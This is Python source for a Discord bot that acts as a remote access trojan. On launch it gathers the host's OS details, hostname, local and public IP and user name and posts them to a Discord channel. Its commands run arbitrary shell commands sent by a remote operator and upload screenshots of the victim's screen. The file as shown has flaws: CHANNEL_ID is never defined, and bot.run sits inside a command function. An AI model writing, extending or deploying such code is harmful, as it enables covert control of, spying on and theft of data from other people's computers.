import platform
import socket
import discord
import subprocess
import pyautogui
import os
from discord.ext import commands

TOKEN = 'YOUR_TOKEN'

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

prompt_message = None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    print('------')

    system_info = f'OS: {platform.system()} {platform.release()}\n'
    system_info += f'NT Kernel Version: {platform.version()}\n'
    system_info += f'Hostname: {socket.gethostname()}\n'

    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    public_ip = subprocess.check_output(['curl', '-k', 'ifconfig.me'], text=True).strip()
    system_info += f'Public IP: {public_ip}\n'
    system_info += f'Local IP: {local_ip}\n'

    try:
        whoami_result = subprocess.check_output(['whoami'], text=True).strip()
    except Exception as e:
        whoami_result = str(e)
    
    system_info += f'WhoAmI: {whoami_result}'

    channel_id = CHANNEL_ID
    channel = bot.get_channel(channel_id)

    if channel:
        await channel.send("Bot started. Here are some system details:\n```" + system_info + "```")

@bot.command()
async def sendcmd(ctx, *, command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        await ctx.send(f'Command executed successfully:\n```{result}```')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Error executing the command:\n```{e.output}```')
    except Exception as e:
        await ctx.send(f'An error occurred:\n```{str(e)}```')

@bot.command()
async def yes(ctx):
    global prompt_message
    if prompt_message:
        await prompt_message.edit(content='Yes')
        prompt_message = None

@bot.command()
async def no(ctx):
    global prompt_message
    if prompt_message:
        await prompt_message.edit(content='No')
        prompt_message = None

@bot.command()
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()

    screenshot.save('screenshot.png')

    await ctx.send(file=discord.File('screenshot.png'))

    os.remove('screenshot.png')

@bot.command()
async def sysinfo(ctx):
    system_info = f'OS: {platform.system()} {platform.release()}\n'
    system_info += f'NT Kernel Version: {platform.version()}\n'
    system_info += f'Hostname: {socket.gethostname()}\n'

    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    public_ip = subprocess.check_output(['curl', '-k', 'ifconfig.me'], text=True).strip()
    system_info += f'Public IP: {public_ip}\n'
    system_info += f'Local IP: {local_ip}\n'

    try:
        whoami_result = subprocess.check_output(['whoami'], text=True).strip()
    except Exception as e:
        whoami_result = str(e)
    
    system_info += f'WhoAmI: {whoami_result}'

    channel_id = CHANNEL_ID
    channel = bot.get_channel(channel_id)

    if channel:
        await channel.send("```" + system_info + "```")

    bot.run(TOKEN)
